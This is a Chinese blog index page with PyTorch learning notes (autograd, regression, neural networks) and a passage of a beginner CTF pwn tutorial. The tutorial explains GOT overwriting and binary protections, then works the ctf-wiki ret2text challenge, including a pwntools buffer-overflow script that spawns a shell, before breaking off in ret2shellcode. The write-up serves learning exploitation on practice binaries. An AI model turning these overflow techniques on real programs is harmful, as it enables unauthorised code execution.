<h3 id="Variable操作"><a href="#Variable操作" class="headerlink" title="Variable操作"></a>Variable操作</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> torch.autograd <span class="keyword">import</span> Variable</span><br><span class="line">x=Variable(torch.ones(<span class="number">2</span>,<span class="number">2</span>),</span><br><span class="line">           requires_grad=<span class="literal">True</span>)</span><br><span class="line">y=Variable(torch.ones(<span class="number">2</span>,<span class="number">2</span>),</span><br><span class="line">          requires_grad=<span class="literal">True</span>)</span><br><span class="line">z=torch.<span class="built_in">sum</span>(x+y)</span><br><span class="line"><span class="built_in">print</span>(z.data)</span><br><span class="line">z.backward()</span><br><span class="line"><span class="built_in">print</span>(x.grad)</span><br></pre></td></tr></table></figure>

<p><code>requires_grad</code>参数表示是否需要对这个参数进行求导，对其使用<code>z.backward()</code>后，通过<code>x.grad</code>可访问具体值</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">x=Variable(torch.FloatTensor([<span class="number">2</span>]),requires_grad=<span class="literal">True</span>)<span class="comment"># []不可省略</span></span><br><span class="line">z=(x+<span class="number">2</span>)**<span class="number">2</span></span><br><span class="line">z.backward()</span><br><span class="line"><span class="built_in">print</span>(x.grad)</span><br><span class="line"><span class="built_in">print</span>(z.data)</span><br></pre></td></tr></table></figure>

<p><img src="/../images/Pytorch%E5%AD%A6%E4%B9%A0.assets/image-20220907184809687.png" alt="image-20220907184809687"></p>
<p>第一行表示该函数导数在x&#x3D;2的值，第二行表示该函数在x&#x3D;2的值</p>
<h2 id="神经网络"><a href="#神经网络" class="headerlink" title="神经网络"></a>神经网络</h2><h3 id="线性模型"><a href="#线性模型" class="headerlink" title="线性模型"></a>线性模型</h3><table>
<thead>
<tr>
<th align="center">时间</th>
<th align="center">成绩</th>
</tr>
</thead>
<tbody><tr>
<td align="center">2</td>
<td align="center">3</td>
</tr>
<tr>
<td align="center">3</td>
<td align="center">5</td>
</tr>
<tr>
<td align="center">4</td>
<td align="center">8</td>
</tr>
<tr>
<td align="center">5</td>
<td align="center">?</td>
</tr>
</tbody></table>
<p>$$<br>\hat{y_i}&#x3D;wx_i+b<br>$$</p>
<p>其中$\hat{y_i}$表示预测的结果，$y_i$表示真实的结果，误差即为<br>$$<br>\frac{1}{n}\sum^n_{i&#x3D;1}(\hat{y_i}-y)^2<br>$$<br>模型通过该loss，修改$wi$和$b$的值，使得loss越接近于零，引入梯度下降概念</p>
<p><img src="/../images/Pytorch%E5%AD%A6%E4%B9%A0.assets/image-20220907190730630.png" alt="image-20220907190730630"><br>$$<br>w&#x3D;w-\eta\frac{\delta loss}{\delta w}<br>$$<br>$\eta$即为学习率，通过代码显示即为：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">liner_model</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> w*x+b</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_loss</span>(<span class="params">y_,y</span>):</span><br><span class="line">    <span class="keyword">return</span> torch.mean((y_-y)**<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">w=Variable(torch.randn(<span class="number">1</span>),requires_grad=<span class="literal">True</span>)</span><br><span class="line">b=Variable(torch.randn(<span class="number">1</span>),requires_grad=<span class="literal">True</span>)</span><br><span class="line">x_train=torch.FloatTensor([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>])</span><br><span class="line">y_train=torch.FloatTensor([<span class="number">5.1</span>,<span class="number">5.95</span>,<span class="number">7.2</span>,<span class="number">8.02</span>,<span class="number">8.99</span>,<span class="number">10.05</span>,<span class="number">11.15</span>,<span class="number">12.03</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> e <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    y_=liner_model(x_train)</span><br><span class="line">    loss=get_loss(y_,y_train)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    loss.backward()</span><br><span class="line"></span><br><span class="line">    w.data=w.data-<span class="number">1e-2</span>*w.grad.data</span><br><span class="line">    b.data=b.data-<span class="number">1e-2</span>*b.grad.data</span><br><span class="line">    <span class="comment">#保险起见推荐用下表述，上述表述新起了一个变量暂存w，可能会丢失Variable的属性，但实测高版本无影响</span></span><br><span class="line">    <span class="comment">#w.data-=1e-2*w.grad.data</span></span><br><span class="line">    <span class="comment">#b.data-=1e-1*b.grad.data</span></span><br><span class="line">    w.grad.zero_()<span class="comment"># 梯度归零</span></span><br><span class="line">    b.grad.zero_()</span><br><span class="line">    <span class="built_in">print</span>(w.data,b.data)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;w:&quot;</span>,w.data,<span class="string">&quot;b:&quot;</span>,b.data,<span class="string">&quot;predict:&quot;</span>,<span class="number">9</span>*w.data+b.data)</span><br></pre></td></tr></table></figure>

<p>其中，每次迭代需要将梯度归零，这里经过查阅资料发现，需要将清零操作放置在梯度下降后，输出结果如下</p>
<p><img src="/../images/Pytorch%E5%AD%A6%E4%B9%A0.assets/image-20220907194325799.png" alt="image-20220907194325799"></p>
<p>假象解为w&#x3D;1,b&#x3D;4，经过实际测试发现，与随机初始的w,b值有关，以及跟学习率的大小也很相关（炼丹玄学）</p>
<h3 id="Logistic回归模型"><a href="#Logistic回归模型" class="headerlink" title="Logistic回归模型"></a>Logistic回归模型</h3><p>针对分类问题<br>$$<br>\hat{y_i}&#x3D;\sigma(w_ix+b)<br>$$<br>其与线性回归唯一不同，多了个sigmoid函数，范围在0~1之间，常常处理二分类问题，因为其二值化的值域可以有效的进行二分类的区分（0到1的概率）<br>$$<br>\sigma(x)&#x3D;\frac{1}{1+e^{-x}}<br>$$<br>其loss函数相较于线性模型更加的复杂<br>$$<br>loss&#x3D;-\frac{1}{n}\sum^n_{i&#x3D;1}(y_ilog\hat{y_i}+(1-y_i)log(1-\hat{y_i}))<br>$$<br><strong>注意</strong>：在二分类问题中，$y_i$只有0和1两个取值，因为其真实结果是确定的</p>
<p><img src="/../images/Pytorch%E5%AD%A6%E4%B9%A0.assets/image-20220907195524175.png" alt="image-20220907195524175"></p>
<p>对于如该点图分布，使用逻辑斯蒂回归进行二分类</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">sigmoid</span>(<span class="params">x</span>):</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>/(<span class="number">1</span>+np.exp(-x))</span><br><span class="line"><span class="comment"># 或者直接使用pytorch内置的sigmod函数</span></span><br><span class="line"><span class="keyword">import</span> torch.nn.functional <span class="keyword">as</span> F</span><br><span class="line">F.sigmoid()</span><br><span class="line">w=Variable(torch.randn(<span class="number">2</span>,<span class="number">1</span>),requires_grad=<span class="literal">True</span>)</span><br><span class="line">b=Variable(torch.zeros(<span class="number">1</span>),requires_grad=<span class="literal">True</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logistic_regression</span>(<span class="params">x</span>):</span><br><span class="line">	<span class="keyword">return</span> F.sigmoid(torch.mm(x,w)+b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">binary_loss</span>(<span class="params">y_pred,y</span>):</span><br><span class="line">    logits=(y*y_pred.clamp(<span class="number">1e-12</span>).log()+(<span class="number">1</span>-y)*(<span class="number">1</span>-y_pred).clamp(<span class="number">1e-12</span>).log()).mean()</span><br><span class="line">    <span class="keyword">return</span> logits</span><br></pre></td></tr></table></figure>

<p>其中，该数学表达式可写成<br>$$<br>\hat{y}&#x3D;\sigma(w_1x+w_2y+b)<br>$$<br>上述仅适合于少量参数情况下，如果参数上百个之多，便需要使用优化器来迭代梯度</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> torch <span class="keyword">import</span> nn</span><br><span class="line">w=nn.Parameter(torch.randn(<span class="number">2</span>,<span class="number">1</span>))</span><br><span class="line">b=nn.Parameter(torch.zeros(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logistic_regression</span>(<span class="params">x</span>):</span><br><span class="line">	<span class="keyword">return</span> F.sigmoid(torch.mm(x,w)+b)</span><br><span class="line"></span><br><span class="line">optimizer=torch.optim.SGD([w,b],lr=<span class="number">1.</span>)</span><br><span class="line">optimizer.zero_grad()<span class="comment">#使用优化器将梯度归零</span></span><br><span class="line">loss.backward()</span><br><span class="line">optimizer.step()<span class="comment"># 使用优化器来更新参数</span></span><br></pre></td></tr></table></figure>

<h3 id="多层神经网络"><a href="#多层神经网络" class="headerlink" title="多层神经网络"></a>多层神经网络</h3><p>应对复杂问题，可以在输入和输出之间嵌套多个线性层和激活函数（即隐含层）。</p>
<p><img src="/../images/Pytorch%E5%AD%A6%E4%B9%A0.assets/image-20220908162527401.png" alt="image-20220908162527401"></p>
<p><strong>为什么加激活函数？</strong></p>
<p>对于一个两层神经网络：<br>$$<br>y&#x3D;w_2\sigma(w_1x)<br>$$<br>若不加激活函数$\sigma$，该网络将变成单一线性网络<br>$$<br>y&#x3D;w_n\dots w_1x&#x3D;\hat{w}x<br>$$</p>
<h4 id="多层神经网络的写法"><a href="#多层神经网络的写法" class="headerlink" title="多层神经网络的写法"></a>多层神经网络的写法</h4><p>一般分为<strong>Sequential</strong>和<strong>Module</strong>两类，其中Module的写法更为灵活，因为Module可以使用Sequential</p>
<p>一些注意事项：</p>
<ul>
<li>sigmoid等等函数集成在了torch.sigmoid位置，老版本还在F中</li>
<li>套用变量时候需要Variable(torch.from_numpy(x).float())，时刻注意tensor和numpy的转换</li>
<li>jupyter notebook似乎可以保存上次的参数继续训练</li>
<li>在一些浅层的tanh网络中，学习率可以稍微设大一点。</li>
<li>网络的设置把握好欠拟合和过拟合的度</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">seq_net = nn.Sequential(</span><br><span class="line">    nn.Linear(<span class="number">2</span>, <span class="number">4</span>), </span><br><span class="line">    nn.Tanh(),</span><br><span class="line">    nn.Linear(<span class="number">4</span>, <span class="number">1</span>)</span><br><span class="line">)</span><br><span class="line"><span class="built_in">print</span>(seq_net[<span class="number">0</span>])</span><br><span class="line">w0=seq_net[<span class="number">0</span>].weight</span><br><span class="line"><span class="built_in">print</span>(w0)</span><br><span class="line">param=seq_net.parameters()</span><br><span class="line">optim=torch.optim.SGD(param,<span class="number">5e-1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> e <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20000</span>):</span><br><span class="line">    out = seq_net(Variable(x))</span><br><span class="line">    loss = criterion(out, Variable(y))</span><br><span class="line">    optim.zero_grad()</span><br><span class="line">    loss.backward()</span><br><span class="line">    optim.step()</span><br><span class="line">    <span class="keyword">if</span> (e + <span class="number">1</span>) % <span class="number">1000</span> == <span class="number">0</span>:</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&#x27;epoch: &#123;&#125;, loss: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(e+<span class="number">1</span>, loss.data))</span><br></pre></td></tr></table></figure>

<p>上为Sequential()方式定义网络</p>
<p>下为Module类的方式定义网络</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">module_net</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,numb_perlayer</span>):</span><br><span class="line">        <span class="built_in">super</span>(module_net,self).__init__()</span><br><span class="line">        self.layer1=nn.Linear(numb_perlayer[<span class="number">0</span>],numb_perlayer[<span class="number">1</span>])</span><br><span class="line">        self.layer2=nn.Tanh()</span><br><span class="line">        self.layer3=nn.Linear(numb_perlayer[<span class="number">1</span>],numb_perlayer[<span class="number">2</span>])</span><br><span class="line">        self.layer4=nn.Tanh()</span><br><span class="line">        self.layer5=nn.Linear(numb_perlayer[<span class="number">2</span>],numb_perlayer[<span class="number">3</span>])</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self,x</span>):</span><br><span class="line">        x=self.layer1(x)</span><br><span class="line">        x=self.layer2(x)</span><br><span class="line">        x=self.layer3(x)</span><br><span class="line">        x=self.layer4(x)</span><br><span class="line">        x=self.layer5(x)</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line">optim = torch.optim.SGD(mo_net.parameters(), <span class="number">0.1</span>)</span><br><span class="line"><span class="keyword">for</span> e <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30000</span>):</span><br><span class="line">    out = mo_net(Variable(x))</span><br><span class="line">    loss = criterion(out, Variable(y))</span><br><span class="line">    optim.zero_grad()</span><br><span class="line">    loss.backward()</span><br><span class="line">    optim.step()</span><br><span class="line">    <span class="keyword">if</span> (e + <span class="number">1</span>) % <span class="number">1000</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;epoch: &#123;&#125;, loss: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(e+<span class="number">1</span>, loss.data))</span><br></pre></td></tr></table></figure>

<p>同样也有两种保存训练好的模型的方式</p>
<ul>
<li><code>torch.save(seq_net,&quot;save_seq_net.pth&quot;)</code>：该方式会将网络的模型也保存下来</li>
<li><code>torch.save(seq_net.state_dict().&quot;save_seq_net_params.pth&quot;)</code>：该方式仅保存参数而不保存模型结构</li>
</ul>
<p>同样，调用时候，第一种直接<code>torch.load(&quot;xxx.pth&quot;)</code>，而第二种先完整定义网络，再导入参数<code>seq_net2.load_state_dict(torch.load(&quot;xxx.pth&quot;))</code></p>
<p>推荐在项目开头，设定随机种子进行使用</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">setup_seed</span>(<span class="params">seed</span>):</span><br><span class="line">    <span class="comment">#random.seed(seed)</span></span><br><span class="line">    np.random.seed(seed)</span><br><span class="line">    torch.manual_seed(seed)</span><br><span class="line">    torch.cuda.manual_seed(seed)</span><br><span class="line">    torch.cuda.manual_seed_all(seed)</span><br><span class="line">    torch.backends.cudnn.benchmark = <span class="literal">False</span></span><br><span class="line">    torch.backends.cudnn.deterministic = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">setup_seed(<span class="number">123</span>)<span class="keyword">def</span> <span class="title function_">setup_seed</span>(<span class="params">seed</span>):</span><br><span class="line">    <span class="comment">#random.seed(seed)</span></span><br><span class="line">    np.random.seed(seed)</span><br><span class="line">    torch.manual_seed(seed)</span><br><span class="line">    torch.cuda.manual_seed(seed)</span><br><span class="line">    torch.cuda.manual_seed_all(seed)</span><br><span class="line">    torch.backends.cudnn.benchmark = <span class="literal">False</span></span><br><span class="line">    torch.backends.cudnn.deterministic = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">setup_seed(<span class="number">123</span>)</span><br></pre></td></tr></table></figure>



<h3 id="多分类问题"><a href="#多分类问题" class="headerlink" title="多分类问题"></a>多分类问题</h3><p>网络仍为线性层，但是最后不使用sigmoid()函数，而是使用<strong>softmax函数</strong>进行多分类的概率匹配<br>$$<br>softmax(z_i)&#x3D;\frac{e^{z_j}}{\sum^k_{j&#x3D;1}e^{z_j}}<br>$$<br>同时，对于多分类下的Loss函数，我们也需要探求一般性计算公式以匹配任意多分类问题，即<strong>交叉熵</strong><br>$$<br>CrossEntropy(p,q)&#x3D;-\frac{1}{m}\sum_xp(x)log\space q(x)<br>$$<br>可以看出，二分类问题的loss也是该公式的变种</p>

    

    

    

  </div>
  <div class="article-info article-info-index">
    
    
	<div class="article-tag tagcloud">
		<i class="icon-price-tags icon"></i>
		<ul class="article-tag-list">
			 
        		<li class="article-tag-list-item">
        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">neural network</a>
        		</li>
      		
		</ul>
	</div>

    

    
    <p class="article-more-link">
      <a class="article-more-a" href="/2023/11/16/Pytorch%E5%AD%A6%E4%B9%A0/">展开全文 >></a>
    </p>
    

    
    <div class="clearfix"></div>
  </div>
  </div>
</article>

<aside class="wrap-side-operation">
    <div class="mod-side-operation">
        
        <div class="jump-container" id="js-jump-container" style="display:none;">
            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
                <i class="icon-font icon-back"></i>
            </a>
            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
                <i class="icon-font icon-plane jump-plane"></i>
            </div>
        </div>
        
        
    </div>
</aside>




  
    <article id="post-basic-pwn" class="article article-type-post  article-index" itemscope itemprop="blogPost">
  <div class="article-inner">
    
      <header class="article-header">
  
  
    <h1 itemprop="name">
	
	  <a class="article-title" href="/2023/11/15/basic-pwn/" target="_blank">basic-pwn</a>
  
    </h1>
  


  
  
<a href="/2023/11/15/basic-pwn/" class="archive-article-date">
        <time datetime="2023-11-14T19:25:02.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-11-15</time>
</a>

  
  
    

  
  </header>
  
  <div class="article-entry" itemprop="articleBody">
    
    <center>pwn从0开始</center>

<p>文章开始前，增加一个辅助视频以帮助了解基本堆栈结构和C语言程序运行时候的状态。</p>
<p><video src="../images/basic-pwn.assets/C语言程序的运行时结构.mp4" width = "600" height = "400"></video></p>
<p>同时，补充一些基本知识</p>
<p><strong>GOT和PLT</strong></p>
<ul>
<li>GOT：全局偏移量表，位于程序的数据段，每个条目8字节，用来存储外部函数（动态链接过来的那些函数）在内存里面的地址，可以在程序运行中被修改，这是因为默认情况下程序只有在需要调用时才导入函数，而不是在一开始就把所有需要用到的函数全部放进表里面。</li>
<li>PLT：过程链接表：位于程序的代码段，每个条目16字节，前两条是特殊条目，分别用于跳转到动态链接器和记录系统启动函数，其余的条目负责调用一个具体的函数（存储外部函数的入口点，也就是这个函数在GOT表的位置）</li>
<li>攻击流程：<ul>
<li>确定printf函数在GOT表中的位置：程序在正常执行调用printf函数时通过PLT表跳转到GOT表的指定条目，此时可以通过对应的汇编指令看到这个位置（当然这样一来printf函数在内存中的实际地址也能知道）</li>
<li>确定system函数在内存中的位置：开启堆栈随机化（ASLR）之后动态链接库在内存的位置是随机的，但是一个函数在其所在的链接库内部的相对地址是不变的，如果printf函数和system函数位于同一个动态链接库，那就可以通过printf在内存中的地址+两个函数在动态链接库内的偏移得到system函数在内存中的实际位置</li>
<li>把system函数在内存中的位置值写入printf函数在GOT表中的位置</li>
<li>程序调用printf函数时，通过PLT表跳转到GOT表的对应条目，但是那里已经被覆写，调用的函数实际上是system而不是printf</li>
</ul>
</li>
</ul>
<p><strong>RELRO</strong></p>
<p>让重定位表只读，避免GOT被恶意修改。RERLO有两种形式：</p>
<ul>
<li>部分RELRO：.init_array、.fini_array、.jcr、.dynamic这些表一次性加载，然后变成只读；.got只读；.got.plt依然可写</li>
<li>前部RELRO：全都不准写！这样会导致所有符号在程序开始的时候导入，性能和时间开销大</li>
</ul>
<p><strong>Stack Canary</strong></p>
<p>函数执行之前在栈的EBP附近插入一个值，如果被溢出攻击，那这个值就有可能被覆盖</p>
<p><strong>NX&#x2F;DEP</strong></p>
<p>数据段不可执行，数据段可以执行，那么就可以将自己的代码随便放在数据段的某个变量里，然后再用溢出使得函数返回到那个数据段的起始地址。开启NX之后，如果程序发现自己返回到了数据段就会终止运行。因此衍生出了ROP攻击，即利用代码段自带的片段拼凑出攻击逻辑。</p>
<p><strong>PIE</strong></p>
<p>地址无关的可执行文件。</p>
<p>正常情况下，内存是这样子的：</p>
<ul>
<li>内核虚拟地址空间（所有进程共享，但是用户空间代码不可见）</li>
<li>栈：函数</li>
<li>动态映射段（动态库在这里）</li>
<li>堆：动态申请的变量</li>
<li>BSS段：未初始化的变量</li>
<li>数据段：静态&#x2F;全局变量</li>
<li>代码段：汇编代码，还有一些字面值变量</li>
</ul>
<p>开启PIE之后，这些段全部打散，通过GOT来登记其实际位置。</p>
<h2 id="多种ROP利用"><a href="#多种ROP利用" class="headerlink" title="多种ROP利用"></a>多种ROP利用</h2><h3 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h3><p>从ctfwiki上下载ret2text二进制程序，<a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#ret2text">链接</a></p>
<p>使用<code>checksec</code>检查是否开启相关保护，可以看出，无地址随机化，无canary，仅仅开启了不可执行栈。该程序为32位程序，拖入IDA 32反汇编查看。</p>
<p><img src="/../images/basic-pwn.assets/image-20231112154156552.png" alt="image-20231112154156552"></p>
<p>IDA反汇编后，查看main函数，F5生成源代码，gets()函数存在堆溢出</p>
<p><img src="/../images/basic-pwn.assets/image-20231112155202026.png" alt="image-20231112155202026"></p>
<p>View-&gt;Open subviews-&gt;strings查询关键字（也可以shift+F12）可以看到，数据资源段有调用&#x2F;bin&#x2F;sh</p>
<p><img src="/../images/basic-pwn.assets/image-20231112162650631.png" alt="image-20231112162650631"></p>
<p>具体位置在secure函数中(空格键查看文本视图)，地址<code>0x0804863A</code></p>
<p><img src="/../images/basic-pwn.assets/image-20231112162754606.png" alt="image-20231112162754606"></p>
<p>目前需要控制gets()函数，使得返回地址直接跳转到system(“&#x2F;bin&#x2F;sh”)处，因此需要计算偏移量。使用gdb运行中调试，在gets()函数处下断点</p>
<p><code>b *0x080486AE</code>将断点打在gets()函数处，查询此处栈内情况</p>
<p><img src="/../images/basic-pwn.assets/image-20231112172001421.png" alt="image-20231112172001421"></p>
<p>可以看出<code>esp:0xffffd3d0</code>，gets()函数写入的参数地址为[esp+1Ch]，计算可得其地址为<code>0xffffd3ec</code>，相较于ebp的偏移为<code>0xffffd458-0xffffd3ec=0x6c</code>，因此返回地址相较于ebp的偏移为[0x6c+4]。</p>
<p>编写payload，其中p32(target)使用+进行字符拼接，需要转换成可编码的形式，因此使用<code>.decode(&quot;iso-8859-1&quot;)</code>。&#x3D;&#x3D;补充，其实直接b”A”*(0x6c+4)就行&#x3D;&#x3D;</p>
<p><img src="/../images/basic-pwn.assets/image-20231112175110982.png" alt="image-20231112175110982"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">proc=process(<span class="string">&quot;./ret2text&quot;</span>)</span><br><span class="line">target=<span class="number">0x0804863a</span></span><br><span class="line">proc.sendline(<span class="string">b&quot;A&quot;</span>*(<span class="number">0x6c</span>+<span class="number">4</span>)+p32(target))</span><br><span class="line">proc.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="/../images/basic-pwn.assets/image-20231112175224002.png" alt="image-20231112175224002"></p>
<p>最终得到shell</p>
<h3 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h3><p>直接checksec</p>
<p><img src="/../images/basic-pwn.assets/image-20231115011728917.png" alt="image-20231115011728917"></p>
<p>可以看出，32位程序，啥也没开，导入IDA</p>
<p><img src="/../images/basic-pwn.assets/image-20231115012036805.png" alt="image-20231115012036805"></p>
<p>反汇编出的内容可以看出，这次没有system()函数调用了，但仍存在栈溢出点，strncpy函数将字符数组s的内容copy入buf2，产生栈溢出。但是由于该程序并未开启不可执行栈，因此可以在栈上插入我们的shellcode，控制返回地址到我们的shellcode处从而执行。</p>
<p><img src="/../images/basic-pwn.assets/v2-db1beae537441e72682b5932b97770b0_1440w.png" alt="v2-db1beae537441e72682b5932b97770b0_1440w"></p>
<p>下表补充ELF文件结构</p>
<table>
<thead>
<tr>
<th align="center">段名</th>
<th align="center">存储属性</th>
<th align="center">内存分配</th>
</tr>
</thead>
<tbody><tr>
<td align="center">代码段 .text</td>
<td align="center">存放可执行程序的指令，存储态和运行态都有</td>
<td align="center">静态</td>
</tr>
<tr>
<td align="center">数据段 .data</td>
<td align="center">存放已初始化（非零初始化的全局变量和静态局部变量）的数据，存储态和运行态都有</td>
<td align="center">静态</td>
</tr>
<tr>
<td align="center">bss段 .bss</td>
<td align="center">存放未初始化（未初始化或者0初始化的全局变量和静态局部变量）的数据，存储态和运行态都有</td>
<td align="center">静态</td>
</tr>
<tr>
<td align="center">堆 heap</td>
<td align="center">动态分配内存，需要通过malloc手动申请，free手动释放，适合大块内存。容易造成内存泄漏和内存碎片。运行态才有。</td>
<td align="center">动态</td>
</tr>
<tr>
<td align="center">栈 stack</td>
<td align="center">存放函数局部变量和参数以及返回值，函数返回后，由操作系统立即回收。栈空间不大，使用不当容易栈溢出。运行态才有</td>
<td align="center">静态</td>
</tr>
</tbody></table>
<p>查找buf2的地址，可以直接在.bss段找，地址为<code>0x0804A080</code>。</p>
<p><img src="/../images/basic-pwn.assets/image-20231115013211426.png" alt="image-20231115013211426"></p>
<p>gdb动态调试代码，在main函数处下断点，使用<code>vmmap</code>查看栈的状态</p>
<p><img src="/../images/basic-pwn.assets/image-20231115013459253.png" alt="image-20231115013459253"></p>
<p>（gef直接高亮闪烁hhh），stack区域可写可读可执行，ret2shellcode方法</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">100</span>]; <span class="comment">// [esp+1Ch] [ebp-64h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;No system for you this time !!!&quot;</span>);</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="built_in">strncpy</span>(buf2, s, <span class="number">0x64</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;bye bye ~&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从IDA的反汇编结果看，s距离ebp的偏移量为64h，实际得再gdb上调试（这里IDA的是错误的）</p>
